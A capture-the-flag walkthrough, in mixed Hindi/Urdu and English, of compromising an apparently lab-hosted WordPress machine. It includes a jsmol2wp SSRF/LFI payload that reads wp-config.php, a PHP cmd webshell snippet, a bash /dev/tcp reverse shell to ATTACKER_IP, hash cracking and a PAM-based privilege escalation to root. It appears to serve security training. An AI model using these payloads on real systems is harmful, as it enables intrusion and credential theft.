Reconnaissance (Enumeration Phase)
Nmap Scan
nmap -sS -sV -T4 <IP>
Open Ports:
• 22/tcp → SSH (OpenSSH)

• 80/tcp → HTTP (Apache)
Web Enumeration
IP ko browser me hit kia → simple website open hui.
 Structure dekhne ke baad confirm hua ke website WordPress per bani hui hai.

WordPress Enumeration
WhatWeb
whatweb http://<IP>
Tech stack confirmation → WordPress detected.
WPScan
wpscan --url http://<IP> --enumerate u,plugins,themes
Important Finding:
 Plugin found:
◇ jsmol2wp
Search karne se pata chala ke is plugin me SSRF vulnerability reported hai.

Exploiting jsmol2wp Plugin (SSRF → Local File Read)
Plugin ka PoC:
http://<target>/wp-content/plugins/jsmol2wp/php/jsmol.php?
isform=true&
call=getRawDataFromDatabase&
query=php://filter/resource=../../../../wp-config.ph
This allowed Local File Inclusion + Filter Bypass, jisse wp-config.php read hua.
wp-config.php ke andar mila:
DB_USER: wpuser
DB_PASSWORD: <password>

Web Application Login (Portal Enumeration)
Website ke andar /www.smol.thm naam ki subdomain/portal mili.
 Yahan wpuser credentials se login ho gaya → indication of weak IAM design.
Portal browse karte huay hello.php plugin ka link mila.
Yahan developer ne error trace/debug comments chod diye thay jisme direct RCE backdoor ka hint tha.
Example:
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}

RCE (Remote Code Execution) → Reverse Shell
Hello.php ko ?cmd=id ke saath test kia → Command Execution working.
Reverse shell:
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
Shell as:
www-data

Database Access (Privilege Enumeration)
Shell ke andar MySQL se connect:
mysql -u wpuser -p
DB me jaake wp_users table dump kia:
select user_login, user_pass from wp_users;
Passwords were phpass hashes, so extracted them → local system per save kiya.

Cracking Hashes using Hashcat
hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt
Sirf diego user ka password crack hua.

Privilege Escalation (User Pivoting)
Shell wapis:
su diego
Now user.txt accessible.
Internal Group Enumeration
id command se pata chala ke diego multiple internal groups ka member hai.
id
Home directory explore kiya → other users’ folders were accessible.
Switching to think user
su think
→ Passwordless privilege (due to group-based trust).
Inside think user home → id_rsa (SSH private key) found.

SSH Access as think
Key ko download kiya:
chmod 400 id_rsa
ssh -i id_rsa think@<IP>
User: think ke shell me access mil gaya.
Again check:
id
→ part of another internal group connected to user gege.

PAM Misconfiguration Exploit (Privilege Escalation)
/etc/pam.d/su ko check karne pe interesting lines:
auth [success=ignore default=1] pam_succeed_if.so user = gege
auth sufficient pam_succeed_if.so use_uid user = think
Iska matlab:
◇ think user seedha gege user ban sakta hai (passwordless su)
So:
su gege

Getting wordpress.old.zip (Loot Collection)
gege user ki home directory me ek important file mili:
wordpress.old.zip
Isko apni kali machine per transfer karne ke liye gege shell me Python server chalaya:
python3 -m http.server 8080
Kali:
wget http://<IP>:8080/wordpress.old.zip

Cracking the WordPress Backup Zip
File password protected thi.
Convert to Hash
zip2john wordpress.old.zip > zip_hash
Crack using John
john zip_hash --wordlist=/usr/share/wordlists/rockyou.txt
Password cracked 🔥
Zip extract:
unzip wordpress.old.zip
Inside → wp-config.php
Yahan se xavi user ke system login credentials mile.

Login as xavi (Privilege Escalation to Root)
su xavi
Sudo Privilege Enum
sudo -l
Output:
(ALL : ALL) ALL
→ xavi can run any command as root.
So simply:
sudo su
You are root 🎉
 Root flag obtained.

Complete Attack Flow Summary

| Step | Action | Result |
| 1 | Nmap Scan | SSH + HTTP open |
| 2 | WP enumerations | Vulnerable plugin found |
| 3 | jsmol2wp SSRF | wp-config.php leaked |
| 4 | Login to portal | hello.php → RCE |
| 5 | Reverse shell | www-data access |
| 6 | DB credentials | WP users hash dump |
| 7 | Hash cracking | diego creds |
| 8 | User pivoting | think → gege |
| 9 | PAM bypass | gege without password |
| 10 | wordpress.old.zip | extracted |
| 11 | zip cracking | xavi credentials |
| 12 | sudo to root | full system takeover |



Final Notes for Learning

🔹 Important Techniques Learned
◇ WordPress plugin exploitation (SSRF, LFI)
◇ PHP RCE backdoor detection
◇ Shell upgrade & reverse shell
◇ MySQL DB enumeration
◇ Hashcat ZIP cracking (mode 17200 optional)
◇ phpass cracking (hashcat -m 400)
◇ Linux privilege escalation (PAM misconfig)
◇ SSH key abuse
◇ Multi-user lateral movement



Real‑world Takeaways
◇ WordPress plugins = biggest attack surface
◇ Misconfigured PAM = privilege escalation gold
◇ Old backups = credentials leak
◇ DB access = full WordPress takeover
◇ Hash cracking chain = essential in CTFs
◇ Internal groups = stealthy privilege escalation
◇ sudo misconfig = instant root access


